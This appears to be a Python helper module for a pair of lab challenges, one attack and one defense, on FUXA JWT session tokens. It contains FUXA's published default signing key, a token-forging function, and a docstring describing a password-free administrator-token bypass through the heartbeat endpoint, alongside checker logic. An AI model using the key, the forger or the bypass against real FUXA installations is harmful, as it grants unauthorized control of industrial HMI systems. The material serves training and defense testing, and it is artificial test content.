"""
Shared pieces for the two FUXA token challenges (fuxa_jwt, defense_fuxa_jwt).

FUXA signs its session tokens (JSON Web Tokens, HS256) with the key in
settings.js `secretCode`. When that line is not set, FUXA falls back to the
key hard-coded in its open-source api/jwt-helper.js. Whoever knows the key
can sign any token FUXA will trust, without a password.

Only the Python standard library and requests are used, so landing needs no
new dependency.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess

import requests

FUXA_URL = "http://172.18.0.4:1881"
# The fallback key of @frangoteam/fuxa-min 1.2.6 (api/jwt-helper.js, line 6).
DEFAULT_SECRET = "frangoteam751"
# FUXA's administrator groups (jwt-helper.js adminGroups).
ADMIN_GROUPS = (-1, 255)
TIMEOUT = 10

# Every token FUXA issues itself (sign-in, the guest token and the token
# refresh in POST /api/heartbeat) is jwt.sign({id, groups}, key, {expiresIn}):
# exactly these four claims, with exp - iat equal to the configured lifetime.
# The lifetimes are the four choices of FUXA's settings dialog (15m, 1h, 3h,
# 1d); 1h is also FUXA's default.
FUXA_CLAIMS = frozenset({"id", "groups", "iat", "exp"})
FUXA_LIFETIMES = frozenset({15 * 60, 60 * 60, 3 * 60 * 60, 24 * 60 * 60})

JWT_RE = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$")


def _b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64decode(segment):
    """Decode one base64url JWT segment (padding optional)."""
    return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))


def forge(payload, secret=DEFAULT_SECRET):
    """Sign payload as an HS256 JWT with secret."""
    header = _b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = _b64(json.dumps(payload, separators=(",", ":")).encode())
    signature = hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
    return f"{header}.{body}.{_b64(signature)}"


def signed_with(token, secret):
    """True if token's HS256 signature was made with secret."""
    try:
        header, body, signature = token.split(".")
        expected = hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
        return hmac.compare_digest(_b64(expected), signature)
    except (ValueError, AttributeError):
        return False


def decode(token):
    """(header, payload) of a JWT-shaped string, or None if it is not one."""
    if not isinstance(token, str) or not JWT_RE.match(token):
        return None
    try:
        header, payload = (json.loads(b64decode(part)) for part in token.split(".")[:2])
    except (ValueError, UnicodeDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def fuxa_could_issue(payload):
    """True if FUXA itself could have signed a token with these claims.

    FUXA 1.2.6 signs a token for anyone who asks. Its middleware
    (jwt-helper.js verifyToken) compares the x-auth-user header with the
    token's groups only when the token is valid; an invalid token, any
    garbage string, falls through as "guest" without that check. The token
    refresh in POST /api/heartbeat with {"params": ...} then signs
    {id: user, groups: groups} straight from the x-auth-user header
    (getNewToken). So x-access-token: garbage plus
    x-auth-user: {"user": "ghost", "groups": -1} returns a FUXA-signed
    administrator token, with no password and whatever secretCode is set.
    Those tokens, like every other FUXA-issued one, have exactly the claims
    id, groups, iat and exp and one of the lifetimes FUXA offers. A token with
    any other claim set or lifetime can only come from someone holding the
    key.
    """
    if set(payload) != FUXA_CLAIMS:
        return False
    iat, exp = payload.get("iat"), payload.get("exp")
    if not all(isinstance(v, int) and not isinstance(v, bool) for v in (iat, exp)):
        return False
    return exp - iat in FUXA_LIFETIMES


def get_users(token=None):
    """GET /api/users, the admin-only user list, with token or with none."""
    headers = {"x-access-token": token} if token is not None else {}
    return requests.get(f"{FUXA_URL}/api/users", headers=headers, timeout=TIMEOUT)


def security_enabled():
    """(ok, detail): FUXA answers and its authentication is switched on.

    With secureEnabled false FUXA treats every caller as an administrator,
    so neither challenge can be judged; a request without a token must be
    refused (401) for a token test to mean anything.
    """
    settings = requests.get(f"{FUXA_URL}/api/settings", timeout=TIMEOUT)
    if settings.status_code != 200:
        return False, f"FUXA /api/settings answered {settings.status_code}"
    if settings.json().get("secureEnabled") is not True:
        return False, "FUXA security (secureEnabled) is switched off: everyone is administrator"
    anonymous = get_users()
    if anonymous.status_code != 401:
        return False, f"FUXA /api/users without a token answered {anonymous.status_code}, expected 401"
    return True, "FUXA authentication is on: /api/users refuses a request without a token"


def own_key_round_trip():
    """(ok, detail): FUXA still signs tokens with a key and accepts its own.

    No password is needed. POST /api/heartbeat without a token hands out a
    guest token signed with FUXA's current key. FUXA's token middleware
    compares the groups of a *valid* token with an x-auth-user header and
    answers 403 when they differ; an invalid token is silently treated as a
    guest and gets 200. So sending the guest token back with a mismatching
    header answers 403 exactly when FUXA verified the token with its key.
    """
    issued = requests.post(f"{FUXA_URL}/api/heartbeat", json={}, timeout=TIMEOUT)
    token = issued.json().get("token") if issued.status_code == 200 else None
    if not token or decode(token) is None:
        return False, f"FUXA did not hand out a guest token (HTTP {issued.status_code})"
    if signed_with(token, DEFAULT_SECRET):
        return False, "FUXA still signs its own tokens with the published default key"
    echo = requests.post(f"{FUXA_URL}/api/heartbeat", json={}, timeout=TIMEOUT,
                         headers={"x-access-token": token,
                                  "x-auth-user": json.dumps({"user": "cybics-check", "groups": 0})})
    if echo.status_code != 403:
        return False, ("FUXA does not accept the tokens it issues itself: its authentication "
                       "is broken, check settings.js and restart FUXA")
    return True, "FUXA issues tokens with a key of its own and accepts them"


def fuxa_container():
    """Name of the running FUXA container, or None (needs the Docker socket)."""
    try:
        result = subprocess.run(["docker", "ps", "--filter", "name=fuxa", "--format", "{{.Names}}"],
                                capture_output=True, text=True, timeout=5)
    except (OSError, subprocess.SubprocessError):
        return None
    names = [n for n in result.stdout.split() if "fuxa" in n.lower()]
    return names[0] if names else None


# Prints only the length of secretCode and how many distinct characters it
# has ("-1 0" when it is not set); the key itself never leaves the FUXA
# container.
_STATS_JS = ("const s=require('/_appdata/settings.js');const k=s.secretCode;"
             "process.stdout.write(typeof k==='string'?k.length+' '+new Set(k).size:'-1 0')")


def secret_stats(container):
    """(length, distinct characters) of secretCode in the container's settings.js.

    (-1, 0) when secretCode is not set, None when it cannot be read (no Docker
    socket, FUXA not running, settings.js does not load).
    """
    try:
        result = subprocess.run(["docker", "exec", container, "node", "-e", _STATS_JS],
                                capture_output=True, text=True, timeout=15)
    except (OSError, subprocess.SubprocessError):
        return None
    if result.returncode != 0:
        return None
    try:
        length, distinct = (int(v) for v in result.stdout.split())
    except ValueError:
        return None
    return length, distinct
